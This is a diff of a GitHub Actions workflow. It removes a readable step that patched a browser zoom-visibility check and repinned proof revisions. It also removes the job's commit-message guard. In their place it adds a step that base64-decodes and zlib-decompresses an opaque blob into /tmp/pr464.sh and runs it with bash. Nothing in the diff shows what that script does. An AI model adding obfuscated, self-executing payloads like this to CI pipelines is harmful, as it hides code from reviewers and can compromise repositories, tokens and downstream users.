@@ -10,113 +10,14 @@ permissions:
 
 jobs:
   patch:
-    if: github.event.head_commit.message == 'Apply PR 464 zoom visible-region fix'
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
         with:
           ref: agent/composition-task-ledger-browser-proof
           fetch-depth: 0
-
-      - name: Patch zoom reachability semantics
+      - name: Apply fixes
         shell: bash
         run: |
-          python - <<'PY'
-          from pathlib import Path
-
-          path = Path('examples/onboarding/task-ledger/browser_proof.py')
-          text = path.read_text(encoding='utf-8')
-          old = '''              const currentViewport = window.visualViewport;
-              const rect = element.getBoundingClientRect();
-              if (!currentViewport || rect.width <= 0 || rect.height <= 0
-                  || rect.left < currentViewport.offsetLeft
-                  || rect.right > currentViewport.offsetLeft + currentViewport.width
-                  || rect.top < currentViewport.offsetTop
-                  || rect.bottom > currentViewport.offsetTop + currentViewport.height) return false;
-              const hit = document.elementFromPoint(
-                rect.left + rect.width / 2,
-                rect.top + rect.height / 2,
-              );
-              return hit === element || element.contains(hit);
-'''
-          new = '''              const currentViewport = window.visualViewport;
-              const rect = element.getBoundingClientRect();
-              if (!currentViewport || rect.width <= 0 || rect.height <= 0) return false;
-              const visibleLeft = Math.max(rect.left, currentViewport.offsetLeft);
-              const visibleRight = Math.min(
-                rect.right,
-                currentViewport.offsetLeft + currentViewport.width,
-              );
-              const visibleTop = Math.max(rect.top, currentViewport.offsetTop);
-              const visibleBottom = Math.min(
-                rect.bottom,
-                currentViewport.offsetTop + currentViewport.height,
-              );
-              if (visibleRight <= visibleLeft || visibleBottom <= visibleTop) return false;
-              const hit = document.elementFromPoint(
-                visibleLeft + (visibleRight - visibleLeft) / 2,
-                visibleTop + (visibleBottom - visibleTop) / 2,
-              );
-              return hit === element || element.contains(hit);
-'''
-          if text.count(old) != 1:
-              raise SystemExit(f'expected one zoom containment block, found {text.count(old)}')
-          path.write_text(text.replace(old, new, 1), encoding='utf-8')
-          PY
-
-          git rm .github/workflows/pr464-zoom-visible-region-fix.yml
-          git config user.name github-actions[bot]
-          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
-          git add examples/onboarding/task-ledger/browser_proof.py
-          git diff --cached --check
-          git commit -m "Check visible zoom regions after scrolling"
-          git rev-parse HEAD > /tmp/proof-revision
-
-      - name: Repin immutable proof and translation provenance
-        shell: bash
-        run: |
-          export PROOF_REVISION="$(cat /tmp/proof-revision)"
-          python - <<'PY'
-          from __future__ import annotations
-
-          import hashlib
-          import json
-          import os
-          from pathlib import Path
-
-          revision = os.environ['PROOF_REVISION']
-          old_revision = '55c45e26c6cb0f109d05098c5b8f863ea9babb62'
-          paths = [
-              Path('docs/guides/webapp-product-walkthrough.md'),
-              Path('translations/ja/docs/guides/webapp-product-walkthrough.md'),
-              Path('tests/test_human_first_webapp_onboarding.py'),
-          ]
-          for path in paths:
-              text = path.read_text(encoding='utf-8')
-              count = text.count(old_revision)
-              if count != 1:
-                  raise SystemExit(f'{path}: expected one old proof revision, got {count}')
-              path.write_text(text.replace(old_revision, revision, 1), encoding='utf-8')
-
-          canonical = Path('docs/guides/webapp-product-walkthrough.md')
-          data = canonical.read_bytes()
-          blob_sha = hashlib.sha1(f'blob {len(data)}\0'.encode('ascii') + data).hexdigest()
-          manifest_path = Path('translations/manifest.json')
-          manifest = json.loads(manifest_path.read_text(encoding='utf-8'))
-          matches = [
-              item for item in manifest['translations']
-              if item['canonical'] == canonical.as_posix() and item['language'] == 'ja'
-          ]
-          if len(matches) != 1:
-              raise SystemExit(f'expected one Japanese walkthrough provenance entry, got {len(matches)}')
-          matches[0]['canonical_blob_sha'] = blob_sha
-          manifest_path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
-          PY
-
-          git add docs/guides/webapp-product-walkthrough.md \
-                  translations/ja/docs/guides/webapp-product-walkthrough.md \
-                  tests/test_human_first_webapp_onboarding.py \
-                  translations/manifest.json
-          git diff --cached --check
-          git commit -m "Repin Task Ledger proof after zoom reachability fix"
-          git push origin HEAD:agent/composition-task-ledger-browser-proof
+          python -c "import base64,zlib;open('/tmp/pr464.sh','wb').write(zlib.decompress(base64.b64decode('eNrdV21v2zYQ/q5fwXoDJCF6cbIkcLq62NqlWIduDdKiQJEGAiVREhuJFEgqtpfmv+9IybbkOE5SoF/mD7ZE3h3v7nl4d/7pWdhIEcaUhYRdoxjLwpJEIZ80HNW0JhmmpVUvVMEZ8tGLF/bZZ9vKBK9QjVVR0hjRquZCoTN4tSy9iKbmxbHJHFd1SWTIWcyxSCnLQ4XllV+SNCdwquAzSURUC86zoF7YrqXIXIG+NhMIgtNILziEJVxrT+1GZf4E5HiZgthoNEKDT8KZVChphCBMfaJkZlybohllKZ8F11Q2uFyu/2ptUxYk0RqkJBXYCHKiXvGG6dNflxRWzmHfcTd1aYacZ5vnfvtmrAUzmkJWXkzReLVUEJoXyqxtWNKfpVRJMpDZjCfgWQYYvYPNHbrCHPByhzLau7NpPN1hVPH6Xn8+8nqHZsyVAtK8vF95izttllywoBrBUIZLSbajVlANWsqTxqDWofcGeHrGKVPOHc/W+d3rgxSiA2+7rDIe9sHbInuHF53nxr3pilU6K0uCgf8KUyYdkAF1oLTFyOz/Qu7HYAeO07gkhpJT9Le++hWeOyuEvB0cdneaPDd+LG1Sdg8NzFW5C/vTb86DdBh4pzm/GS+wzLv/iuy296q9Yg+G217Fx8a762Y+GK9mzgAL4EQfbmDM0Pn1vg73R1z8/vF7G975/V13ezHogbdW77z3B87/sPoAWdVtEbYaiBBaoYueTdH+c2NbYCoJ+rCQilSnc6qcDPpwDbiTFHFG0L8cHO2MmrPikidXHsp0IUA3G4ZvodeaZjwTVJG2GxsRQeoSJ0QLeQgKlof2XQ/dbdRnny0rh+hEhQL4LZo4nHFxlZXQ+sNaHB4f+tojv0ucL0hOOfMzOg8WVWlUwdmM5qiBUSFguCKotePjRIGovAA+X94RJBUMLuhwf3IyOZgc7G1R+U3LyYBxHcqicw5Cr4wtnKboqfOLUUxpliHfT3BSQMbhoSDJVedeVcGPX6HRa724JEsLSRu4RDhTRCCZCF6WcODIOjt///5NdH766e2Ht+//mY5+dkw+ybVfYwFQ/3n6+x/uyAKQzRg2kLa2j25RlDXAOxJFy+kNM8YVNsmxuqUCZkGY7zz0VXLmIS53jH3gDcQC50xBLoBJkgrOLuyhM/alHtuinqx9dJQcHpGD4+Q4icfZ/vgkHR+NTybJUTzJJse/EHwS4zg+PrANCSWoXBiSt/Ml3HoZ5g1NAaIZiXFd+wBF2iTKn+HyShWCNzlUwtR2vZ6aEpjJsg02/IrD7zVDpJKh/o6KpsIsyqiA59ZCtKaMGWw969LKuDDZQ5SZX9le2MeOvG3Ng4sJwsNbukppKwTloZVbF4V7CsONPvT2ORoUCD1aG0ajpVkP5VyhG2P0tvPkoaIQrZXXT9tLhJVgxhlNcLn65/AESKwUKwyKKyNtEuMFIOO4FlS3OJKFlugIHcDbPgSvd9BNSZijLbi3X8Z2YJwjjo1lQqntQoU3e9Du5inNAWqwCFDTTKM++K8zINVSJNBXx16rgLReCUqOU+kMDO2CXhtQUEfW/Ie0V0jzyTwAn5a2LgaOwI3rCKHlLuxVjuxLaDe9lGEZ1VzSueNCJUg76RKzvME5aYXtr9gGEoMtnbLOoac0nr9wjRkBkR6CmmjXhGGWECCGEouOav0jbu1V/Bfjy14Q0RJb7SBavgzx6VPUpD5tqnqdek1HqQuhAXz6Rs8ZHuQzBWemBxp/+wuzd/U13ScezVb0ZXUbv7sI9W08vgLdd/KAqY/vX+ekBtJ9hF6I3ple2FWMtnl1/Qws4JiWVC0QtPORsVE3skAcBm5Q143rOfCLqRBMa/5pn/xeh/W7Dusb69Z/mHlp6w==')) )"
+          bash /tmp/pr464.sh
